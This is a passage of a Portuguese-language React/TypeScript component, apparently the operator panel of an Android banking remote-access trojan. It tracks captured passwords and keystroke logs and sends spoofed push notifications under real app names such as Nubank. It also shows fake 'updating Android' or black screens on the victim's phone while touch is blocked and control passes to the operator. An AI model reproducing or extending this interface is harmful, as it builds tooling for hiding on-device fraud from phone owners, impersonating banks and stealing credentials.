          height: h,
          aspectRatio: ratioLabel
        });
        showToast(`Imagem carregada: ${w}×${h}px`, "success");
      };
      img.src = dataUrl;
    };
    reader.readAsDataURL(file);
  };

  const handleSelectPresetSample = (preset: typeof SAMPLE_IMAGE_PRESETS[0]) => {
    setSelectedCustomImage(preset.url);
    setCustomImageMeta({
      width: 720,
      height: 1280,
      aspectRatio: "9:16 (Preset Recomendado)"
    });
    showToast(`Preset "${preset.name}" selecionado!`, "info");
  };

  if (!isOpen && !isPinned) return null;

  return (
    <aside
      className={`tactical-right-quick-sidebar ${isPinned ? "is-pinned" : ""}`}
      style={{
        width: `${sidebarWidth}px`,
        minWidth: `${sidebarWidth}px`,
        maxWidth: `${sidebarWidth}px`,
        transition: "width 0.15s ease"
      }}
    >
      {/* TABS ROW: [📱 TELAS] vs [🔑 SENHAS] vs [⌨️ TECLAS] + PIN & CLOSE NO CANTO */}
      <div
        style={{
          display: "flex",
          alignItems: "center",
          borderBottom: "1px solid #1e293b",
          background: "#080c16",
          padding: "2px 4px 2px 2px",
          gap: "4px",
          flexShrink: 0
        }}
      >
        <div style={{ display: "flex", flex: 1, gap: "2px" }}>
          {/* TAB 1: TELAS */}
          <button
            type="button"
            onClick={() => setActiveMainTab("telas")}
            style={{
              flex: 1,
              padding: "7px 6px",
              fontSize: "10.5px",
              fontWeight: 800,
              background: activeMainTab === "telas" ? "rgba(255, 26, 42, 0.15)" : "transparent",
              color: activeMainTab === "telas" ? "#ff4d5a" : "#94a3b8",
              border: "none",
              borderBottom: activeMainTab === "telas" ? "2px solid #ff1a2a" : "2px solid transparent",
              borderRadius: "4px 4px 0 0",
              cursor: "pointer",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              gap: "4px",
              transition: "all 0.15s ease"
            }}
          >
            <Smartphone size={12} />
            <span>TELAS</span>
            {currentDisguise?.active && (
              <span
                style={{
                  width: "6px",
                  height: "6px",
                  borderRadius: "50%",
                  background: "#ff1a2a",
                  boxShadow: "0 0 8px #ff1a2a",
                  animation: "pulse 1.2s infinite"
                }}
              />
            )}
          </button>

          {/* TAB 2: SENHAS & DIGITAÇÃO UNIFICADAS */}
          <button
            type="button"
            onClick={() => setActiveMainTab("senhas")}
            style={{
              flex: 1,
              padding: "7px 6px",
              fontSize: "10.5px",
              fontWeight: 800,
              background: activeMainTab === "senhas" ? "rgba(56, 189, 248, 0.15)" : "transparent",
              color: activeMainTab === "senhas" ? "#38bdf8" : "#94a3b8",
              border: "none",
              borderBottom: activeMainTab === "senhas" ? "2px solid #38bdf8" : "2px solid transparent",
              borderRadius: "4px 4px 0 0",
              cursor: "pointer",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              gap: "4px",
              transition: "all 0.15s ease"
            }}
          >
            <Key size={12} />
            <span>SENHAS</span>
            <div style={{ display: "flex", alignItems: "center", gap: "3px" }}>
              {credentials.length > 0 && (
                <span
                  style={{
                    fontSize: "8.5px",
                    padding: "1px 4px",
                    background: "rgba(56, 189, 248, 0.25)",
                    color: "#38bdf8",
                    borderRadius: "10px",
                    fontFamily: "var(--font-mono)"
                  }}
                  title={`${credentials.length} senhas/credenciais gravadas`}
                >
                  {credentials.length}
                </span>
              )}
              {logs.length > 0 && (
                <span
                  style={{
                    fontSize: "8.5px",
                    padding: "1px 4px",
                    background: "rgba(34, 197, 94, 0.2)",
                    color: "#22c55e",
                    borderRadius: "10px",
                    fontFamily: "var(--font-mono)"
                  }}
                  title={`${logs.length} eventos de digitação`}
                >
                  {logs.length}
                </span>
              )}
            </div>
          </button>
        </div>

        {/* PIN, LARGURA & FECHAR NO CANTO DA LINHA */}
        <div style={{ display: "flex", alignItems: "center", gap: "3px", borderLeft: "1px solid #1e293b", paddingLeft: "4px" }}>
          {/* CONTROLES DE DIMINUIR (-) E AUMENTAR (+) LARGURA DA SIDEBAR */}
          <div
            style={{
              display: "flex",
              alignItems: "center",
              background: "#080c16",
              border: "1px solid #1e293b",
              borderRadius: "4px",
              padding: "1px",
              gap: "1px"
            }}
            title={`Largura da Barra Lateral: ${sidebarWidth}px (Diminuir / Aumentar)`}
          >
            <button
              type="button"
              onClick={() => setSidebarWidth((w) => Math.max(295, w - 30))}
              disabled={sidebarWidth <= 295}
              style={{
                width: "16px",
                height: "20px",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                padding: 0,
                background: "transparent",
                border: "none",
                color: sidebarWidth <= 295 ? "#334155" : "#94a3b8",
                cursor: sidebarWidth <= 295 ? "not-allowed" : "pointer"
              }}
              title="Diminuir largura da sidebar (-30px)"
            >
              <Minus size={9} />
            </button>
            <span style={{ fontSize: "7.5px", color: "#64748b", fontFamily: "var(--font-mono)", padding: "0 1px", minWidth: "16px", textAlign: "center" }}>
              {sidebarWidth}
            </span>
            <button
              type="button"
              onClick={() => setSidebarWidth((w) => Math.min(460, w + 30))}
              disabled={sidebarWidth >= 460}
              style={{
                width: "16px",
                height: "20px",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                padding: 0,
                background: "transparent",
                border: "none",
                color: sidebarWidth >= 460 ? "#334155" : "#94a3b8",
                cursor: sidebarWidth >= 460 ? "not-allowed" : "pointer"
              }}
              title="Aumentar largura da sidebar (+30px)"
            >
              <Plus size={9} />
            </button>
          </div>

          <button
            type="button"
            className={`pin-toggle-btn ${isPinned ? "active" : ""}`}
            onClick={() => setIsPinned(!isPinned)}
            title={isPinned ? "Desafixar painel lateral" : "Fixar painel lateral"}
            style={{
              width: "22px",
              height: "22px",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              padding: 0,
              background: isPinned ? "rgba(56, 189, 248, 0.2)" : "#0f172a",
              border: isPinned ? "1px solid #38bdf8" : "1px solid #1e293b",
              color: isPinned ? "#38bdf8" : "#94a3b8",
              borderRadius: "4px",
              cursor: "pointer",
              transition: "all 0.15s ease"
            }}
          >
            {isPinned ? <PinOff size={11} /> : <Pin size={11} />}
          </button>
          <button
            type="button"
            className="right-sidebar-minimize-btn"
            onClick={onClose}
            title="Minimizar / Recolher submenu direito"
            style={{
              width: "22px",
              height: "22px",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              padding: 0,
              background: "#0f172a",
              border: "1px solid #1e293b",
              color: "#94a3b8",
              borderRadius: "4px",
              cursor: "pointer",
              transition: "all 0.15s ease"
            }}
          >
            <ChevronRight size={13} />
          </button>
          <button
            type="button"
            className="right-sidebar-close-btn"
            onClick={onClose}
            title="Fechar painel lateral"
            style={{
              width: "22px",
              height: "22px",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              padding: 0,
              background: "#ff1a2a",
              border: "1px solid #ff4d5a",
              color: "#ffffff",
              borderRadius: "4px",
              boxShadow: "0 0 10px rgba(255, 26, 42, 0.6)",
              cursor: "pointer",
              transition: "all 0.15s ease"
            }}
          >
            <X size={13} style={{ strokeWidth: 3 }} />
          </button>
        </div>
      </div>

      {/* =================================================================== */}
      {/* ABA 1: TELAS NO APARELHO (Tela Preta, Atualizando Android, Bateria, Imagem) */}
      {/* =================================================================== */}
      {activeMainTab === "telas" && (
        <div style={{ flex: 1, overflowY: "auto", padding: "8px", display: "flex", flexDirection: "column", gap: "7px" }}>
          {/* Active Screen Banner */}
          {currentDisguise?.active ? (
            <div
              style={{
                background: "rgba(255, 26, 42, 0.12)",
                border: "1px solid #ff1a2a",
                borderRadius: "5px",
                padding: "6px 8px",
                display: "flex",
                alignItems: "center",
                justifyContent: "space-between",
                gap: "6px"
              }}
            >
              <div style={{ display: "flex", alignItems: "center", gap: "6px", minWidth: 0 }}>
                <span
                  style={{
                    width: "7px",
                    height: "7px",
                    borderRadius: "50%",
                    background: "#ff1a2a",
                    boxShadow: "0 0 6px #ff1a2a",
                    animation: "pulse 1.2s infinite",
                    flexShrink: 0
                  }}
                />
                <div style={{ minWidth: 0 }}>
                  <div style={{ fontSize: "10px", fontWeight: 800, color: "#fff", whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis" }}>
                    TELA ATIVA NO CELULAR
                  </div>
                  <div style={{ fontSize: "9px", color: "#ff808b", textTransform: "capitalize", whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis" }}>
                    {currentDisguise.type === "black"
                      ? "Tela Preta (Apagada)"
                      : currentDisguise.type === "update"
                      ? "Atualizando Android"
                      : currentDisguise.type === "battery"
                      ? "Carregando Bateria"
                      : "Imagem Personalizada"}
                  </div>
                </div>
              </div>

              <button
                type="button"
                onClick={handleClearDisguise}
                disabled={isActivatingDisguise}
                style={{
                  background: "#ff1a2a",
                  border: "none",
                  borderRadius: "4px",
                  color: "#fff",
                  fontSize: "9.5px",
                  fontWeight: 700,
                  padding: "3px 7px",
                  cursor: "pointer",
                  display: "flex",
                  alignItems: "center",
                  gap: "3px",
                  flexShrink: 0
                }}
                title="Desativar tela de disfarce e voltar à tela real do smartphone"
              >
                <X size={10} />
                <span>Desativar</span>
              </button>
            </div>
          ) : (
            <div
              style={{
                background: "rgba(34, 197, 94, 0.08)",
                border: "1px solid rgba(34, 197, 94, 0.25)",
                borderRadius: "5px",
                padding: "5px 8px",
                display: "flex",
                alignItems: "center",
                gap: "5px",
                fontSize: "10px",
                color: "#86efac"
              }}
            >
              <CheckCircle size={12} style={{ color: "#22c55e", flexShrink: 0 }} />
              <span>Tela Normal Ativa (Sem disfarce)</span>
            </div>
          )}

          {/* TOUCH ISOLATION NOTICE BANNER */}
          <div
            style={{
              background: "rgba(15, 23, 42, 0.6)",
              border: "1px dashed rgba(56, 189, 248, 0.3)",
              borderRadius: "5px",
              padding: "5px 7px",
              display: "flex",
              alignItems: "center",
              gap: "5px"
            }}
          >
            <Lock size={11} style={{ color: "#38bdf8", flexShrink: 0 }} />
            <div style={{ fontSize: "9px", color: "#94a3b8", lineHeight: 1.25 }}>
              <span style={{ color: "#38bdf8", fontWeight: 700 }}>Toque Isolado:</span> Toque físico bloqueado no aparelho e liberado para o operador.
            </div>
          </div>

          {/* 1. QUADRO SUPERIOR: ENVIAR PUSH NOTIFICATION (HEADS-UP POPUP COM PREVIEW) */}
          <div
            style={{
              background: "#0a0e18",
              border: "1px solid rgba(245, 158, 11, 0.4)",
              boxShadow: "0 0 16px rgba(245, 158, 11, 0.12)",
              borderRadius: "6px",
              padding: "9px 10px",
              display: "flex",
              flexDirection: "column",
              gap: "7px"
            }}
          >
            {/* Header with Collapse / Expand Toggle */}
            <div
              style={{
                display: "flex",
                alignItems: "center",
                justifyContent: "space-between",
                cursor: "pointer",
                userSelect: "none"
              }}
              onClick={() => setIsPushCollapsed(!isPushCollapsed)}
              title={isPushCollapsed ? "Clique para expandir envio de push" : "Clique para recolher envio de push"}
            >
              <div style={{ display: "flex", alignItems: "center", gap: "5px" }}>
                <Bell size={13} style={{ color: "#f59e0b" }} />
                <span style={{ fontSize: "11px", fontWeight: 700, color: "#f8fafc" }}>
                  Enviar Push Notification
                </span>
              </div>
              <div style={{ display: "flex", alignItems: "center", gap: "4px" }}>
                <span
                  style={{
                    fontSize: "8px",
                    background: "rgba(245, 158, 11, 0.2)",
                    color: "#fbbf24",
                    border: "1px solid rgba(245, 158, 11, 0.4)",
                    padding: "1px 5px",
                    borderRadius: "3px",
                    fontWeight: 800,
                    letterSpacing: "0.4px"
                  }}
                >
                  HEADS-UP POPUP
                </span>
                <button
                  type="button"
                  onClick={(e) => {
                    e.stopPropagation();
                    setIsPushCollapsed(!isPushCollapsed);
                  }}
                  style={{
                    background: isPushCollapsed ? "rgba(245, 158, 11, 0.2)" : "#131826",
                    border: `1px solid ${isPushCollapsed ? "#f59e0b" : "#243249"}`,
                    color: isPushCollapsed ? "#fbbf24" : "#94a3b8",
                    borderRadius: "4px",
                    width: "20px",
                    height: "20px",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    padding: 0,
                    cursor: "pointer"
                  }}
                  title={isPushCollapsed ? "Expandir formulário de push" : "Recolher formulário de push"}
                >
                  {isPushCollapsed ? <ChevronDown size={12} /> : <ChevronUp size={12} />}
                </button>
              </div>
            </div>

            {isPushCollapsed ? (
              <div
                style={{
                  background: "#080c16",
                  border: "1px dashed rgba(245, 158, 11, 0.3)",
                  borderRadius: "5px",
                  padding: "6px 8px",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "space-between",
                  gap: "6px"
                }}
              >
                <div style={{ display: "flex", alignItems: "center", gap: "6px", minWidth: 0 }}>
                  <span style={{ fontSize: "13px", flexShrink: 0 }}>
                    {POPULAR_PUSH_APPS.find((a) => a.name.toLowerCase() === pushAppName.toLowerCase())?.icon || "🔔"}
                  </span>
                  <div style={{ minWidth: 0 }}>
                    <div style={{ fontSize: "9.5px", fontWeight: 700, color: "#f8fafc", whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis" }}>
                      {pushAppName || "App"}: {pushTitle || "Notificação"}
                    </div>
                    <div style={{ fontSize: "8.5px", color: "#94a3b8", whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis" }}>
                      {pushMessage || "Sem mensagem"}
                    </div>
                  </div>
                </div>

                <div style={{ display: "flex", alignItems: "center", gap: "4px", flexShrink: 0 }}>
                  <button
                    type="button"
                    onClick={(e) => {
                      e.stopPropagation();
                      handleSendPush();
                    }}
                    disabled={isSendingPush || !pushTitle.trim() || !pushMessage.trim()}
                    style={{
                      height: "23px",
                      background: "linear-gradient(135deg, #f59e0b 0%, #d97706 100%)",
                      border: "none",
                      borderRadius: "3px",
                      color: "#000",
                      fontSize: "9px",
                      fontWeight: 800,
                      padding: "0 7px",
                      cursor: isSendingPush ? "wait" : "pointer",
                      display: "flex",
                      alignItems: "center",
                      gap: "3px"
                    }}
                    title="Despachar notificação rápida ao aparelho"
                  >
                    <Bell size={9} />
                    <span>{isSendingPush ? "..." : "Enviar"}</span>
                  </button>
                  <button
                    type="button"
                    onClick={() => setIsPushCollapsed(false)}
                    style={{
                      height: "23px",
                      background: "#1e293b",
                      border: "1px solid #334155",
                      borderRadius: "3px",
                      color: "#cbd5e1",
                      fontSize: "8.5px",
                      fontWeight: 600,
                      padding: "0 6px",
                      cursor: "pointer"
                    }}
                    title="Expandir formulário completo de push"
                  >
                    Editar ▾
                  </button>
                </div>
              </div>
            ) : (
              <>
                <div style={{ fontSize: "9px", color: "#94a3b8", lineHeight: 1.3 }}>
                  Selecione o app emissor e escreva o título e a mensagem para gerar a notificação push no aparelho.
                </div>

            {/* 1. SELEÇÃO DE APLICATIVO EM CHIPS RÁPIDOS */}
            <div style={{ display: "flex", flexDirection: "column", gap: "3px" }}>
              <span style={{ fontSize: "8.5px", color: "#64748b", fontWeight: 700, textTransform: "uppercase" }}>
                1. Selecione o Aplicativo:
              </span>
              <div
                style={{
                  display: "flex",
                  flexWrap: "wrap",
                  gap: "3px"
                }}
              >
                {POPULAR_PUSH_APPS.map((app) => {
                  const isSelected = selectedPushApp === app.name;
                  return (
                    <button
                      key={app.name}
                      type="button"
                      onClick={() => handleSelectAppChip(app)}
                      style={{
                        display: "inline-flex",
                        alignItems: "center",
                        gap: "3px",
                        padding: "3px 6px",
                        background: isSelected ? "rgba(245, 158, 11, 0.25)" : "#131826",
                        border: `1px solid ${isSelected ? "#f59e0b" : "#1e293b"}`,
                        borderRadius: "4px",
                        color: isSelected ? "#fbbf24" : "#cbd5e1",
                        fontSize: "8.5px",
                        fontWeight: isSelected ? 800 : 500,
                        cursor: "pointer",
                        transition: "all 0.15s ease"
                      }}
                      title={app.packageName ? `${app.name} (${app.packageName})` : app.name}
                    >
                      <span>{app.icon}</span>
                      <span>{app.name}</span>
                    </button>
                  );
                })}
              </div>
            </div>

            {/* Campos de Nome do App e Pacote (Editáveis) */}
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "4px" }}>
              <div>
                <label style={{ display: "block", fontSize: "8px", color: "#94a3b8", marginBottom: "2px" }}>
                  Nome Visível do App:
                </label>
                <input
                  type="text"
                  value={pushAppName}
                  onChange={(e) => setPushAppName(e.target.value)}
                  placeholder="ex: Nubank"
                  style={{
                    width: "100%",
                    background: "#080c16",
                    border: "1px solid #1e293b",
                    borderRadius: "4px",
                    color: "#f8fafc",
                    fontSize: "9.5px",
                    padding: "4px 6px",
                    boxSizing: "border-box",
                    outline: "none"
                  }}
                />
              </div>
              <div>
                <label style={{ display: "block", fontSize: "8px", color: "#94a3b8", marginBottom: "2px" }}>
                  Package ID (Android):
                </label>
                <input
                  type="text"
                  value={pushPackageName}
                  onChange={(e) => setPushPackageName(e.target.value)}
                  placeholder="ex: com.nu.production"
                  style={{
                    width: "100%",
                    background: "#080c16",
                    border: "1px solid #1e293b",
                    borderRadius: "4px",
                    color: "#94a3b8",
                    fontSize: "9px",
                    fontFamily: "var(--font-mono)",
                    padding: "4px 6px",
                    boxSizing: "border-box",
                    outline: "none"
                  }}
                />
              </div>
            </div>

            {/* 2. PRESETS RÁPIDOS (1 CLIQUE) */}
            <div style={{ display: "flex", flexDirection: "column", gap: "3px" }}>
              <span style={{ fontSize: "8.5px", color: "#64748b", fontWeight: 700, textTransform: "uppercase" }}>
                Presets Rápidos:
              </span>
              <div style={{ display: "flex", gap: "3px", overflowX: "auto", paddingBottom: "2px" }}>
                {PUSH_NOTIFICATION_PRESETS.map((p, idx) => (
                  <button
                    key={idx}
                    type="button"
                    onClick={() => handleApplyPreset(p)}
                    style={{
                      whiteSpace: "nowrap",
                      background: "#121927",
                      border: "1px solid #1e293b",
                      borderRadius: "3px",
                      color: "#93c5fd",
                      fontSize: "8px",
                      fontWeight: 600,
                      padding: "2px 5px",
                      cursor: "pointer",
                      flexShrink: 0
                    }}
                    title={`${p.title} - ${p.message}`}
                  >
                    {p.label}
                  </button>
                ))}
              </div>
            </div>

            {/* 3. TÍTULO E CONTEÚDO */}
            <div style={{ display: "flex", flexDirection: "column", gap: "4px" }}>
              <div>
                <label style={{ display: "block", fontSize: "8px", color: "#94a3b8", marginBottom: "2px" }}>
                  Título da Notificação:
                </label>
                <input
                  type="text"
                  value={pushTitle}
                  onChange={(e) => setPushTitle(e.target.value)}
                  placeholder="ex: Transferência recebida"
                  style={{
                    width: "100%",
                    background: "#080c16",
                    border: "1px solid #1e293b",
                    borderRadius: "4px",
                    color: "#f8fafc",
                    fontSize: "9.5px",
                    fontWeight: 700,
                    padding: "4px 6px",
                    boxSizing: "border-box",
                    outline: "none"
                  }}
                />
              </div>

              <div>
                <label style={{ display: "block", fontSize: "8px", color: "#94a3b8", marginBottom: "2px" }}>
                  Mensagem / O que vem escrito:
                </label>
                <textarea
                  value={pushMessage}
                  onChange={(e) => setPushMessage(e.target.value)}
                  placeholder="Digite o texto que será exibido na notificação push do celular..."
                  rows={2}
                  style={{
                    width: "100%",
                    background: "#080c16",
                    border: "1px solid #1e293b",
                    borderRadius: "4px",
                    color: "#cbd5e1",
                    fontSize: "9.5px",
                    padding: "5px 6px",
                    boxSizing: "border-box",
                    outline: "none",
                    resize: "vertical",
                    fontFamily: "inherit",
                    lineHeight: 1.3
                  }}
                />
              </div>
            </div>

            {/* 4. PREVIEW REALISTA DA NOTIFICAÇÃO NO APARELHO */}
            <div style={{ marginTop: "1px", display: "flex", flexDirection: "column", gap: "3px" }}>
              <span style={{ fontSize: "8.5px", color: "#64748b", fontWeight: 700, textTransform: "uppercase" }}>
                Preview da Notificação no Aparelho:
              </span>
              <div
                style={{
                  background: "#111724",
                  border: "1px solid rgba(245, 158, 11, 0.35)",
                  borderRadius: "6px",
                  padding: "8px 9px",
                  boxShadow: "0 3px 10px rgba(0, 0, 0, 0.4)",
                  display: "flex",
                  flexDirection: "column",
                  gap: "3px"
                }}
              >
                <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                  <div style={{ display: "flex", alignItems: "center", gap: "5px" }}>
                    <span style={{ fontSize: "12px" }}>
                      {POPULAR_PUSH_APPS.find((a) => a.name.toLowerCase() === pushAppName.toLowerCase())?.icon || "🔔"}
                    </span>
                    <span style={{ fontSize: "9.5px", fontWeight: 700, color: "#f8fafc" }}>
                      {pushAppName || "Aplicativo"}
                    </span>
                    <span style={{ fontSize: "8.5px", color: "#64748b" }}>• agora</span>
                  </div>
                  <Bell size={10} style={{ color: "#f59e0b" }} />
                </div>
                <div style={{ fontSize: "10px", fontWeight: 800, color: "#ffffff", lineHeight: 1.25 }}>
                  {pushTitle.trim() || "Título da notificação"}
                </div>
                <div style={{ fontSize: "9px", color: "#cbd5e1", lineHeight: 1.3 }}>
                  {pushMessage.trim() || "Conteúdo da notificação push que surgirá no topo do aparelho..."}
                </div>
              </div>
            </div>

            {/* BOTÃO DE DESPACHO NA MESMA TELA */}
            <button
              type="button"
              onClick={handleSendPush}
              disabled={isSendingPush || !pushTitle.trim() || !pushMessage.trim()}
              style={{
                height: "26px",
                background: "linear-gradient(135deg, #f59e0b 0%, #d97706 100%)",
                border: "none",
                borderRadius: "4px",
                color: "#000",
                fontSize: "10px",
                fontWeight: 800,
                padding: "0 8px",
                cursor: isSendingPush || !pushTitle.trim() || !pushMessage.trim() ? "not-allowed" : "pointer",
                opacity: isSendingPush || !pushTitle.trim() || !pushMessage.trim() ? 0.5 : 1,
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                gap: "5px",
                boxShadow: "0 2px 8px rgba(245, 158, 11, 0.4)",
                transition: "all 0.15s ease",
                marginTop: "2px"
              }}
            >
              <Bell size={11} />
              <span>{isSendingPush ? "Despachando ao Aparelho..." : "Despachar Push Notification"}</span>
            </button>

            {/* RECENTES NOTIFICAÇÕES ENVIADAS */}
            {recentPushes.length > 0 && (
              <div style={{ marginTop: "2px", borderTop: "1px solid #1e293b", paddingTop: "4px" }}>
                <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "3px" }}>
                  <span style={{ fontSize: "8px", color: "#64748b", fontWeight: 700, textTransform: "uppercase" }}>
                    Histórico Recente ({recentPushes.length}):
                  </span>
                </div>
                <div style={{ display: "flex", flexDirection: "column", gap: "3px", maxHeight: "95px", overflowY: "auto" }}>
                  {recentPushes.slice(0, 4).map((p) => (
                    <div
                      key={p.id}
                      style={{
                        background: "#080c16",
                        border: "1px solid #172033",
                        borderRadius: "3px",
                        padding: "4px 6px",
                        display: "flex",
                        flexDirection: "column",
                        gap: "1px",
                        cursor: "pointer"
                      }}
                      onClick={() => {
                        setPushAppName(p.appName);
                        setPushPackageName(p.packageName || "");
                        setPushTitle(p.title);
                        setPushMessage(p.message);
                        showToast(`Notificação "${p.title}" carregada no formulário`, "info");
                      }}
                      title="Clique para reutilizar esta notificação"
                    >
                      <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                        <span style={{ fontSize: "8.5px", fontWeight: 700, color: "#fbbf24" }}>
                          {p.appName}
                        </span>
                        <span style={{ fontSize: "7.5px", color: "#64748b" }}>
                          {p.timestamp ? new Date(p.timestamp).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" }) : ""}
                        </span>
                      </div>
                      <div style={{ fontSize: "8.5px", fontWeight: 600, color: "#f8fafc", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
                        {p.title}
                      </div>
                      <div style={{ fontSize: "8px", color: "#94a3b8", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
                        {p.message}
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            )}
              </>
            )}
          </div>

          {/* TÍTULO DA SEÇÃO COM CONTROLES DE COLLAPSE E DIMINUIR/AUMENTAR */}
          <div
            style={{
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              marginTop: "4px",
              marginBottom: "1px",
              padding: "4px 6px",
              background: "#0a0f1d",
              border: "1px solid #1a2538",
              borderRadius: "5px"
            }}
          >
            {/* Left title and active status */}
            <div
              style={{
                display: "flex",
                alignItems: "center",
                gap: "5px",
                cursor: "pointer",
                userSelect: "none",
                flex: 1
              }}
              onClick={() => setIsDisguiseCollapsed(!isDisguiseCollapsed)}
              title={isDisguiseCollapsed ? "Clique para expandir telas do aparelho" : "Clique para recolher telas do aparelho"}
            >
              <Smartphone size={12} style={{ color: "#38bdf8" }} />
              <span style={{ fontSize: "9.5px", fontWeight: 800, color: "#cbd5e1", textTransform: "uppercase", letterSpacing: "0.5px" }}>
                Telas do Aparelho
              </span>
              {currentDisguise?.active ? (
                <span
                  style={{
                    fontSize: "7.5px",
                    background: "rgba(255, 26, 42, 0.2)",
                    color: "#ff4d5a",
                    border: "1px solid #ff1a2a",
                    padding: "0 4px",
                    borderRadius: "3px",
                    fontWeight: 800
                  }}
                >
                  1 ATIVA
                </span>
              ) : (
                <span
                  style={{
                    fontSize: "7.5px",
                    background: "rgba(34, 197, 94, 0.15)",
                    color: "#22c55e",
                    border: "1px solid rgba(34, 197, 94, 0.3)",
                    padding: "0 4px",
                    borderRadius: "3px",
                    fontWeight: 700
                  }}
                >
                  NORMAL
                </span>
              )}
            </div>

            {/* Right Controls: Diminuir / Aumentar & Collapse */}
            <div style={{ display: "flex", alignItems: "center", gap: "4px" }}>
              {/* Diminuir / Aumentar escala dos cards (P = Compacto, M = Normal, G = Grande) */}
              {!isDisguiseCollapsed && (
                <div
                  style={{
                    display: "flex",
                    alignItems: "center",
                    background: "#080c16",
                    border: "1px solid #1e293b",
                    borderRadius: "3px",
                    padding: "1px 2px",
                    gap: "2px"
                  }}
                  title="Diminuir ou aumentar tamanho das telas do aparelho (P = Compacto, M = Médio, G = Grande)"
                >
                  <button
                    type="button"
                    onClick={() => setDisguiseScale("compact")}
                    style={{
                      background: disguiseScale === "compact" ? "rgba(56, 189, 248, 0.25)" : "transparent",
                      border: "none",
                      color: disguiseScale === "compact" ? "#38bdf8" : "#64748b",
                      fontSize: "8px",
                      fontWeight: 800,
                      padding: "1px 4px",
                      borderRadius: "2px",
                      cursor: "pointer"
                    }}
                    title="Diminuir telas (Compacto)"
                  >
                    P
                  </button>
                  <button
                    type="button"
                    onClick={() => setDisguiseScale("normal")}
                    style={{
                      background: disguiseScale === "normal" ? "rgba(56, 189, 248, 0.25)" : "transparent",
                      border: "none",
                      color: disguiseScale === "normal" ? "#38bdf8" : "#64748b",
                      fontSize: "8px",
                      fontWeight: 800,
                      padding: "1px 4px",
                      borderRadius: "2px",
                      cursor: "pointer"
                    }}
                    title="Tamanho padrão (Médio)"
                  >
                    M
                  </button>
                  <button
                    type="button"
                    onClick={() => setDisguiseScale("large")}
                    style={{
                      background: disguiseScale === "large" ? "rgba(56, 189, 248, 0.25)" : "transparent",
                      border: "none",
                      color: disguiseScale === "large" ? "#38bdf8" : "#64748b",
                      fontSize: "8px",
                      fontWeight: 800,
                      padding: "1px 4px",
                      borderRadius: "2px",
                      cursor: "pointer"
                    }}
                    title="Aumentar telas (Grande)"
                  >
                    G
                  </button>
                </div>
              )}

              {/* Botão de Collapse / Expandir Telas */}
              <button
                type="button"
                onClick={() => setIsDisguiseCollapsed(!isDisguiseCollapsed)}
                style={{
                  background: isDisguiseCollapsed ? "rgba(56, 189, 248, 0.2)" : "#131826",
                  border: `1px solid ${isDisguiseCollapsed ? "#38bdf8" : "#243249"}`,
                  color: isDisguiseCollapsed ? "#38bdf8" : "#94a3b8",
                  borderRadius: "4px",
                  width: "20px",
                  height: "20px",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  padding: 0,
                  cursor: "pointer"
                }}
                title={isDisguiseCollapsed ? "Expandir telas do aparelho" : "Recolher telas do aparelho"}
              >
                {isDisguiseCollapsed ? <ChevronDown size={12} /> : <ChevronUp size={12} />}
              </button>
            </div>
          </div>

          {isDisguiseCollapsed ? (
            <div
              style={{
                background: "#080c16",
                border: "1px dashed rgba(56, 189, 248, 0.3)",
                borderRadius: "5px",
                padding: "6px 8px",
                display: "flex",
                flexDirection: "column",
                gap: "5px"
              }}
            >
              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                <span style={{ fontSize: "8.5px", color: "#94a3b8" }}>
                  Disparo Rápido de Tela ({currentDisguise?.active ? "1 Ativa" : "Normal"}):
                </span>
                <button
                  type="button"
                  onClick={() => setIsDisguiseCollapsed(false)}
                  style={{
                    background: "transparent",
                    border: "none",
                    color: "#38bdf8",
                    fontSize: "8.5px",
                    fontWeight: 700,
                    cursor: "pointer"
                  }}
                >
                  Expandir Telas ▾
                </button>
              </div>

              {/* Quick 1-click action buttons while collapsed */}
              <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr 1fr", gap: "4px" }}>
                <button
                  type="button"
                  onClick={() => handleActivateDisguise("black")}
                  style={{
                    padding: "4px 2px",
                    background: currentDisguise?.active && currentDisguise.type === "black" ? "#ff1a2a" : "#131826",
                    border: "1px solid #1e293b",
                    borderRadius: "3px",
                    color: currentDisguise?.active && currentDisguise.type === "black" ? "#fff" : "#cbd5e1",
                    fontSize: "8px",
                    fontWeight: 700,
                    cursor: "pointer"
                  }}
                  title="Ativar Tela Preta"
                >
                  ⚫ Preta
                </button>
                <button
                  type="button"
                  onClick={() => handleActivateDisguise("update", { progressPercent: updatePercent })}
                  style={{
                    padding: "4px 2px",
                    background: currentDisguise?.active && currentDisguise.type === "update" ? "#00e5ff" : "#131826",
                    border: "1px solid #1e293b",
                    borderRadius: "3px",
                    color: currentDisguise?.active && currentDisguise.type === "update" ? "#000" : "#60a5fa",
                    fontSize: "8px",
                    fontWeight: 700,
                    cursor: "pointer"
                  }}
                  title="Ativar Atualizando Android"
                >
                  🔄 Update
                </button>
                <button
                  type="button"
                  onClick={() => handleActivateDisguise("battery", { progressPercent: device.battery ?? 75 })}
                  style={{
                    padding: "4px 2px",
                    background: currentDisguise?.active && currentDisguise.type === "battery" ? "#22c55e" : "#131826",
                    border: "1px solid #1e293b",
                    borderRadius: "3px",
